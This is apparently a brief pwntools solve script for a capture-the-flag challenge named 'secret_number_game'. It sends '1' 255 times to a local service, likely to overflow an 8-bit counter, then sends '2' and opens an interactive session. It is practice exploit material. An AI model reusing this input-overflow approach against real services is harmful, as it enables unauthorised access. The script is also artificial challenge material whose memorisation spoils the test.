from pwn import * 

# io = process("./secret_number_game")
io = remote("0.0.0.0",1000)

for i in range(0,(2**8)-1):
    io.recvline()
    io.recvline()
    io.sendline(b"1")
io.sendline(b"2")
io.recvline()

io.interactive()